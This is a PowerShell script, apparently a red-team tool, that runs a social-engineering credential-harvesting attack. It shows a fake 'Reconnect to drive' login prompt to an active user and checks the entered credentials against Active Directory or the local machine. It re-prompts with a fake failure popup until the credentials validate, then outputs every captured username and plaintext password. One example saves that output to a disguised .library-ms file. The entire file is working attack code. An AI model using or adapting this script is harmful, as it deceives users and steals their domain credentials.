#require -version 2
Function Invoke-MappedDriveSEAttack{
<#
# All credit to the original author(s): Ryan Watson (Watson0x90)
#
# Create-Unattend.ps1 is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Create-Unattend.ps1 is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Create-Unattend.ps1.  If not, see <http://www.gnu.org/licenses/>.

.SYNOPSIS Social engineering attack to propmtping users re-enter 
credentials for a mapped drive on their computer. This 
will perform a check till valid workstation or domain creds
are entered. Output will return both valid and unvalid credentials.

This attack requires:
	1) The user is active
	2) There are mapped drives on the host

Example Output:

	Domain    Username        Password  Valid
	------    --------        --------  -----
	MyDomain  MyDomain\user   P@ssword  False
	MyDomain  MyDomain\admin  P@ssword  True

.Description Social engineering attack to propmtping users re-enter credentials for a mapped drive on their computer.

.Example
	Invoke-MappedDriveSEAttack
	
	Invoke-MappedDriveSEAttack | Out-File C:\users\public\libraries\tmp.library-ms
#>

$ErrorActionPreference = "SilentlyContinue"
$error1 = "User is not active. Exiting..."
$error2 = "No mapped drives on host. Exiting..."

function Error-BadCredentialsPrompt{
	$wshell = New-Object -ComObject Wscript.Shell
	$wshell.Popup("Bad Username or Password",0,"Fail Authentication",0x5+0x10)
}

Function Test-ADCredentials {
	Param($username, $password,$domain)
	$LDAPDomain = (([adsisearcher]"").Searchroot.path)
	$domain = New-Object System.DirectoryServices.DirectoryEntry($LDAPDomain,$username,$password)
	if($domain.name -ne $null){
		return $true
	}else{
		return $false
	}
}

Function Test-MachineCredentials {
	Param($username, $password, $domain)
	Add-Type -AssemblyName System.DirectoryServices.AccountManagement
	$ct = [System.DirectoryServices.AccountManagement.ContextType]::Machine
	$pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ct, $domain)
	$isValid = $pc.ValidateCredentials($username, $password)
	return $isValid
}

$Source = @"

    using System;
    using System.Runtime.InteropServices;

    internal struct LASTINPUTINFO 
    {
        public uint cbSize;

        public uint dwTime;
    }

    public class IdleTimeFinder
    {
        [DllImport("user32.dll")]
        static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("Kernel32.dll")]
        private static extern uint GetLastError();

        public static uint GetLastInputTime()
        {
            uint idleTime = 0;
            LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
            lastInputInfo.cbSize = (uint)Marshal.SizeOf( lastInputInfo );
            lastInputInfo.dwTime = 0;

            uint envTicks = (uint)Environment.TickCount;

            if ( GetLastInputInfo( ref lastInputInfo ) )
            {
            uint lastInputTick = lastInputInfo.dwTime;

            idleTime = envTicks - lastInputTick;
            }

            return (( idleTime > 0 ) ? ( idleTime / 1000 ) : 0);
        }
    }

"@
    
	Add-Type -TypeDefinition $Source -Language CSharp
	$IdleTime = [IdleTimeFinder]::GetLastInputTime()

	$AvailableDrives = Get-PsDrive -PSProvider FileSystem | ? {$_.Used -gt 1kb -and $_.Name -ne "C"}
	
	if($IdleTime -lt 1){
		if($AvailableDrives -ne $null){
			$Drive = $AvailableDrives | Select Root -ExpandProperty Root | Get-Random -Count 1
			
			$ValidCreds = $false
			$credentials = @()
			Do{
				#$testCred = Steal-Credential -driveLetter $Drive
				
				$cred = $host.ui.promptforcredential("Reconnect to "+$Drive,"Windows is unable to access "+$Drive+"                                    Authtication Required. ",$env:UserDomain + "\" + $env:UserName,$env:UserDomain)
				
				$UserDefDomain = $cred.GetNetworkCredential().Domain
				$Username = $cred.UserName
				$Password = $cred.GetNetworkCredential().Password
				$CurrentDomain = $env:USERDOMAIN
				
				if ($env:ComputerName  -eq $UserDefDomain){
					$isValid = Test-MachineCredentials -username $Username -password $Password -domain $UserDefDomain
				}else{
					$isValid = Test-ADCredentials -username $Username -password $Password
				}
								
				if($isValid -eq $false){
					$credentialsTemp = new-object psobject -prop @{Domain=$CurrentDomain;Username=$Username;Password=$Password;Valid=$false}
					$credentials += $credentialsTemp
					$retry = Error-BadCredentialsPrompt
					if($retry -eq 2){
						"## User exited erorr prompt without retry ##"
						break
					}
				}else{
					$credentialsTemp = new-object psobject -prop @{Domain=$CurrentDomain;Username=$Username;Password=$Password;Valid=$true}
					$credentials += $credentialsTemp
					$ValidCreds = $true
				}
			}
			While($ValidCreds -eq $false)
			"##Credentials##"
			$credentials | Select Domain,Username,Password,Valid | FT -AutoSize
		}else{$error2}
	}else{$error1}
	
}
